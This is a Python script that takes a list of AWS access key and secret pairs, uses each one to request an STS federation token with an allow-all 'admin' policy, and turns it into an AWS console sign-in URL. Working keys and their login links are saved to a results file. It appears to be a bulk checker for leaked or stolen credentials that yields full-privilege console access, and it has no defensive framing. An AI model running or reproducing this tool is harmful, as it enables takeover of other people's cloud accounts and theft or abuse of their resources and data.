import boto3
import urllib.parse
import json
from colorama import init, Fore
import urllib.request

init(autoreset=True)

FEDERATION_URL = "https://signin.aws.amazon.com/federation?Action=getSigninToken&%s"
SIGNIN_URL = "https://signin.aws.amazon.com/federation?Action=login&Destination=https://console.aws.amazon.com&SigninToken=%s"

def get_federation_token(key, secret):
    try:
        client = boto3.client(
            'sts',
            aws_access_key_id=key,
            aws_secret_access_key=secret,
            region_name='us-east-1'
        )
        response = client.get_federation_token(
            Name='admin',
            Policy=json.dumps({
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "Stmt1",
                        "Effect": "Allow",
                        "Action": "*",
                        "Resource": "*"
                    }
                ]
            }),
            DurationSeconds=3600
        )['Credentials']
        return {
            "sessionId": response['AccessKeyId'],
            "sessionKey": response['SecretAccessKey'],
            "sessionToken": response['SessionToken']
        }
    except Exception as e:
        print(f"{Fore.RED}Failed: {e}")
        return None

def get_console_url(key, secret):
    token = get_federation_token(key, secret)
    try:
        url_data = urllib.parse.urlencode({"Session": token})
        with urllib.request.urlopen(FEDERATION_URL % url_data) as res:
            signin_token = json.loads(res.read().decode("utf-8"))["SigninToken"]
            console_url = SIGNIN_URL % signin_token
            print(f"{Fore.GREEN}Success: {token['sessionId']}")
            return console_url
    except Exception as e:
        print(f"{Fore.RED}Failed: {e}")
        return f"Failed: {key}"

def main():
    keys_file = input("Enter File Access_Key: ")

    try:
        with open(keys_file, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}Gada filenya TOLOL")
        return

    with open('results.txt', 'a') as result_file:
        for line in lines:
            access_key, secret_key = line.strip().split('|')
            result = get_console_url(access_key, secret_key)
            if result and not result.startswith("Failed"):
                result_file.write(f"{access_key}|{secret_key}\n")
                result_file.write(result + '\n')
                result_file.write("=============================\n")
                result_file.flush()

if __name__ == '__main__':
    main()
